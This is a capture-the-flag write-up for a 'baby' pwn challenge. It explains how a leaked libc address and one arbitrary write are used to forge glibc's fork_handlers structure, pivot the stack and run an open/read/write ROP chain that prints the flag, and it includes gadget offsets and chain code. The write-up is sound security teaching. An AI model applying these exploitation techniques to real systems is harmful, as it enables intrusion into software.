# unbrevable

| | |
|---|---|
| Event | The Few Chosen CTF 2026 |
| Category | pwn |
| Difficulty | baby |
| Author | minipif |
| Points at close | 119 |
| Solves | 122 |
| Status | solved |

> should be easy? now in pwn

Files: [`unbrevable.zip`](handout/unbrevable.zip)

<details>
<summary><b>Solution</b></summary>

The program ends on `fork()` and the seccomp filter forbids `clone`, which reads like a wall and is the door. glibc's `fork` calls `__run_fork_handlers` before it ever issues the syscall, that function reads a structure out of libc `.bss` at `libc+0x221ae0`, and the one arbitrary write the program gives you reaches it. Forge that structure and the doomed `fork()` becomes an indirect call through a pointer you chose with a first argument you also chose, several instructions before the kernel gets a chance to kill anything. Everything after that point is a stack pivot and a plain open, read, and write chain, so the discussion below spends its length on how `__run_fork_handlers` came into view.

## Recon, in the order it ran

```
$ unzip -l handout/unbrevable.zip
$ file scratch/vuln_patched
$ checksec --file=scratch/vuln_patched
```

A 24 KB PIE, a pinned `ld-2.35.so`, a pinned `libc.so.6`, and a Dockerfile. `checksec` gives Full RELRO, a canary, NX, and PIE, so the GOT is read-only and every address in the exploit has to descend from a leak.

![the handout and the binary](media/01-setup-checksec.png)

A headless Ghidra pass produced [`artifacts/vuln.c`](artifacts/vuln.c), and `main` turns out to be five statements without a loop around them.

```c
init(param_1);                          // setvbuf on all three streams
setup_seccomp();
printf("%p\n", PTR_setvbuf_00103fe8);   // the resolved setvbuf GOT entry, free libc leak
__isoc99_scanf("%zu %zu ", &local_20, local_18);
fgets(local_20, local_18[0], stdin);    // one write, arbitrary address, arbitrary length
fork();
return 0;
```

Read that against the protections and the shape of the challenge is already fixed. One leak arrives without being asked for, `scanf` takes a destination pointer and a length as plain decimal, and `fgets` performs a single write of whatever size was requested wherever it was pointed. There is no loop, so the write happens once, and the only program statement after it is `fork()`.

The leaked value is the resolved GOT entry for `setvbuf` rather than a libc base, so the base is `leak - libc.symbols['setvbuf']`. The `scanf` format ends in a space, `"%zu %zu "`, so it eats trailing whitespace before returning and the payload can follow the two numbers on the very next send.

![main() is five statements](media/02-recon-main.png)

Read the filter next, because it decides what the payload is allowed to end in.

```
$ sed -n '/---- setup_seccomp/,/^}$/p' artifacts/vuln.c
```

The nine `seccomp_rule_add` calls use raw syscall numbers, and a BPF dump of the loaded program is in `scratch/seccomp-dump.txt` for anyone who would rather read it that way. The allowlist is `read`, `write`, `open`, `openat`, `rt_sigprocmask`, `rt_sigreturn`, `exit`, `exit_group`, and `execveat`, and everything else returns `KILL_PROCESS`. The filter blocks `mmap`, so a shellcode page is unavailable. It blocks `execve`, so `system("/bin/sh")` is off the table. `execveat` is on the allowlist, but without `mmap` or a writable file to point it at, it is not much of an offer. The allowlist includes `open`, `read`, and `write`, so the payload is an open, read, and write chain reading the flag out of the filesystem.

![the seccomp allowlist](media/03-recon-seccomp.png)

There is also no `clone`, so `fork()` kills the process outright. Run the binary with `0 0` on stdin so that `fgets` writes nothing at all, and watch what an untouched run does.

```
$ docker run --rm -v "$PWD:/w:ro" -w /tmp ubuntu:22.04 bash -c \
    'cp /w/vuln_patched /w/ld-2.35.so /w/libc.so.6 /tmp/; printf "0 0\n" > in; ./vuln_patched < in; echo $?'
159
```

Exit status 159 is 128 plus 31, SIGSYS, so the kernel killed the process at `clone`. A program that dies on its last statement still has to get there, and glibc's `fork` does work on the way.

## What runs before `clone`

```
$ readelf -sW libc.so.6 | grep -w fork_handlers
  1811: 0000000000221ae0  1560 OBJECT  LOCAL  DEFAULT   35 fork_handlers
$ objdump -d --start-address=0xeaf17 --stop-address=0xeaf5d -M intel libc.so.6
```

```
eaf17:  mov    rbp,QWORD PTR [rip+0x136bc2]   # 221ae0 <fork_handlers>
eaf1e:  mov    rdi,rbp
eaf21:  test   rbp,rbp
eaf24:  jne    eaf54
eaf30:  mov    rax,rbp
eaf33:  shl    rax,0x5
eaf37:  add    rax,QWORD PTR [rip+0x136bb2]   # 221af0 <fork_handlers+0x10>
eaf3e:  mov    rax,QWORD PTR [rax]
eaf41:  test   rax,rax
eaf44:  je     eaf48
eaf46:  call   rax
eaf54:  sub    rbp,0x1
eaf58:  cmp    rbp,rdi
eaf5b:  jb     eaf30
```

Sixteen instructions of writable-memory-driven indirect call, running inside libc `.bss`, before the syscall that gets us killed. `fork_handlers.used` loads into `rbp` at `eaf17` and then straight into `rdi` at `eaf1e`, the loop decrements `rbp` once, and the handler pointer is fetched from `fork_handlers.array + (used-1)*32` and called. One arbitrary write into that structure therefore produces an indirect call with a chosen target and a chosen first argument.

![fork() is fatal, but __run_fork_handlers runs first](media/04-insight-fork-handlers.png)

Forging it takes one piece of modular arithmetic. The value in `used` becomes `rdi`, so `used` has to be the address you want in `rdi`, call it `A`. The handler is read from `array + (used-1)*32`, and you want that to resolve to a slot `H` you also control, so `array` has to hold `H - (A-1)*32`, a wildly negative value that wraps mod 2^64 into a perfectly ordinary qword; glibc's own index arithmetic then undoes the wrap and lands exactly on `H`. In [`solve/solve.py`](solve/solve.py) the whole structure sits at `B = libc+0x221ae0` with `A = B+0x20` and `H = B+0x30`, so the forgery, the `rdi` target, the handler pointer, the string `flag`, and the entire ROP chain live in one contiguous 0x400-byte blob written by one `fgets`.

![where the 1024 bytes land](media/05b-exploit-payload-map.png)

## One call and one register have to become a stack

At the moment of the hijacked `call rax` you control only the target and `rdi`, and a single call with a single argument is not a chain, so the first gadget has to spend that one register on acquiring a stack.

```
$ objdump -d --start-address=0x167420 --stop-address=0x16742e -M intel libc.so.6
  libc+0x167420:  mov    rdx,QWORD PTR [rdi+0x8]
  libc+0x167424:  mov    QWORD PTR [rsp],rax
  libc+0x167428:  call   QWORD PTR [rdx+0x20]
```

That one gadget reads a second pointer out of memory you wrote and then calls through it, so the single controlled register picks both the new stack and the gadget that installs it. `libc+0x5a120` is `mov rsp,rdx ; ret`, and `libc+0x45f25` is `add rsp,0x28 ; ret`, which steps the freshly installed stack past the pivot slot itself so the chain does not immediately re-enter the gadget that got it there. After those three the process is holding an ordinary ROP stack inside libc `.bss` and the rest is pop-and-call.

![one call becomes a stack pivot](media/05-exploit-ropchain.png)

The work was staged. `scratch/t3.py` skips the pivot entirely and points the handler at `puts` with `rdi` aimed at the string `HELLOWORLD`, proving the forged structure works on its own. `scratch/t4.py` runs a bare `puts` through the magic gadget, then a `puts` after the pivot, then a full chain. `scratch/t5.py` isolates `open`, `write`, and `read` from each other, and that is where the next problem surfaced.

## The file descriptor is not 3

socat forks per connection and leaks its own descriptors into the child, so the process starts life with 0 through 5 already taken and with descriptor 3 already being a socket. A hardcoded `read(3, ...)` blocks forever because descriptor 3 is already a socket.

```
$ docker exec unbrev-shot sh -c 'ls -l /proc/<child>/fd'
```

The first descriptor `open("flag")` can return is 6, and hardcoding 6 would work until the day socat holds a different number, so the chain moves the real return value instead.

```
  libc+0x90088:  mov    rdi,rax
  libc+0x9008b:  call   QWORD PTR [rbx+0x360]
```

The gadget requires `rbx` to point at an address with a usable pointer at `+0x360`. The chain sets `rbx = B` early with a `pop rdx ; pop rbx ; ret`. It plants `add rsp,8 ; ret` at `B+0x360`, bringing the chain back to its next slot as though the detour had not happened. `scratch/t6.py` is the first version with that gadget, and also the first to read the flag.

With that in place the chain is short enough to read in one screen, and every address in it is an offset from the same leaked base.

```python
chain = [
    base + G_RDXRBX, 0, B,        # rbx = B, so [rbx+0x360] is the add rsp,8 we planted
    base + G_RDI, NAME,           # "flag", sitting at B+0x38
    base + G_RSI, 0,
    base + s["open"],
    base + G_RDIRAX,              # rdi = the fd open actually returned
    base + G_RSI, BUF,
    base + G_RDXRBX, 0x100, B,
    base + s["read"],
    base + G_RDI, 1,
    base + G_RSI, BUF,
    base + G_RDXRBX, 0x100, B,
    base + s["write"],
    base + G_RDI, 0,
    base + s["_exit"],
]
```

![the chain against a local container](media/06-exploit-run-local.png)

## The one real fragility

`fgets` stops at `0x0a`. Nearly every qword in the payload is derived from the libc base, so whether a given connection is usable is a property of that run's ASLR and nothing the exploit can control. `scratch/aslr_rate.py` imports the real `build_payload` and runs it over 20,000 random page-aligned bases with a fixed seed.

```
$ ctf-python scratch/aslr_rate.py
  20000 random page aligned libc bases in 0x7f0000000000..0x7fffffffffff, seed 1234
  payload contains a 0x0a byte, so fgets would truncate it: 2245/20000 = 11.2%
```

So roughly one connection in nine is wasted, and the cheapest fix is to detect the byte before sending anything and simply reconnect, so the loop in [`solve/solve.py`](solve/solve.py) rebuilds the payload at each new base and gives up only after thirty attempts. Running it end to end against a container built from the handout Dockerfile takes one environment variable.

```
$ CTF_LOCAL=1 ctf-python solve/solve.py
```

## The dead end was downstream of the exploit

Five submissions failed before the flag was accepted, four of them the local placeholder `TFCCTF{local_fake_flag_for_testing}` submitted by an autosubmit watcher that could not tell a container flag from a contest one. The refusal wrote a rejection marker keyed by challenge slug, so when the genuine flag arrived four minutes later the watcher suppressed it. Deleting the marker let the next pass through.

![the flag, and why it took five submissions](media/07-flag.png)
Flag: `TFCCTF{well_known_technique_brudda}`
</details>
